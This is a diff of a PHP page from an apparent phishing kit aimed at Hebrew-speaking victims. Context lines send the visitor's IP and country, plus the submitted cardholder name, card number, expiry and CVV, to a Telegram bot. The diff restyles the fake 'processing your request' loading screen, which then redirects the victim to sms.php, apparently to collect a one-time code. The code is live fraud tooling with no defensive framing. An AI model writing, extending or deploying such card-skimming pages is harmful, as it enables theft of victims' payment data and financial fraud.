@@ -111,45 +111,53 @@ tg_send("📥 <b>Visit:</b> x.php\\nIP: $ip\\nCountry: $cc");
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   tg_send("💳 <b>Card Submitted</b>\\n👤 Name: {$_POST['card_name']}\\n💳 Number: {$_POST['card_number']}\\n📅 Exp: {$_POST['expiry_date']}\\n🔒 CVV: {$_POST['cvv']}\\n🌐 IP: $ip");
   echo '
-  <html><head><meta charset="UTF-8"><title>מאמת...</title>
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>מעבד בקשה...</title>
   <style>
     body {
-      background: #f9f9f9;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 120px;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f6fa;
+      font-family: "Segoe UI", Tahoma, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      color: #222;
     }
-    .loader3d {
-      width: 64px;
-      height: 64px;
-      margin: auto;
-      border-radius: 50%;
-      background: conic-gradient(#007bff 10%, transparent 0 40%, #007bff 0 60%, transparent 0 90%, #007bff 0);
-      animation: spin 1s linear infinite;
+    .loader-text {
+      font-size: 1.2em;
+      margin-top: 20px;
     }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    .dots span {
+      animation: blink 1.5s infinite;
+      font-size: 2em;
+      margin: 0 2px;
     }
-    p {
-      margin-top: 30px;
-      color: #333;
-      font-size: 1.1em;
+    .dots span:nth-child(2) { animation-delay: 0.2s; }
+    .dots span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes blink {
+      0%, 80%, 100% { opacity: 0; }
+      40% { opacity: 1; }
     }
   </style>
-  </head>
-  <body>
-    <div class="loader3d"></div>
-    <p>מאמת את פרטי הכרטיס...</p>
-    <script>
-      setTimeout(function() {
-        window.location.href = "sms.php";
-      }, 3000);
-    </script>
-  </body></html>';
-  exit;
-  exit;
-}
+</head>
+<body>
+  <img src="https://i.imgur.com/5LZ8dA5.gif" alt="Loading" width="90" />
+  <div class="loader-text">מעבד את הבקשה שלך<span class="dots"><span>.</span><span>.</span><span>.</span></span></div>
+  <script>
+    setTimeout(function() {
+      window.location.href = "sms.php"; // or final.php
+    }, 3000);
+  </script>
+</body>
+</html>';
+exit;
 ?>
 <!DOCTYPE html>
 <html lang="<?= $lang ?>" dir="<?= $dir ?>">
